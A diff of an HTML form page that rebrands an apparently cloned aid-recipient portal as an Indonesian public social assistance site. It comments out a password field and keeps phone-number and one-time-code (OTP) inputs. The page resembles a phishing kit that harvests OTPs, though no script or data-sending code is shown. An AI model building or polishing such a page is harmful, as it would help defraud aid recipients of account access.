@@ -203,20 +203,17 @@
 
     <main class="flex-shrink-0">
       <div id="ctl00_divContainer" class="container container-narrow">
-        <div class="text-center mt-2">
-          <a
-            id="ctl00_lnkMalay"
-            disabled="disabled"
-            style="color: Black; font-weight: bold; text-decoration: none"
-            >Bahasa Indonesia</a
-          >
-          <span id="ctl00_lblPipe_bm"> | </span>
-          <a id="ctl00_lnkEng" href="">English</a>
-          <span id="ctl00_lblPipe_bi"> | </span>
-          <a id="ctl00_lnkChineseSimplified" href=""> 中文(简体) </a>
-          <span id="ctl00_lblPipe_bc"> | </span>
-          <a id="ctl00_lnkTamilInd" href="">தமிழ் </a>
+        <header class="bg-dark text-white">
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container-fluid justify-content-center"> <!-- Tambahkan kelas justify-content-center -->
+            <a class="navbar-brand" href="#">Bantuan Sosial Masyarakat Indonesia</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
         </div>
+    </nav>
+</header>
+
         <div class="header mt-3 text-center">
           <img
             src="images/ini.jpg"
@@ -293,7 +290,7 @@
               id="validatePhoneNumber"
               readonly=""
             />
-            <div class="mb-3">
+            <!-- <div class="mb-3">
               <label for="password" class="form-label">
                 <span id="ctl00_RecipientMasterContent_lblEntry_IDNo"
                   >Kata sandi [opsional]</span
@@ -308,7 +305,7 @@
                 placeholder="********"
                 required
               />
-            </div>
+            </div> -->
             <div class="mb-3">
               <label for="otp" class="form-label">
                 <span id="ctl00_RecipientMasterContent_lblEntry_IDNo"
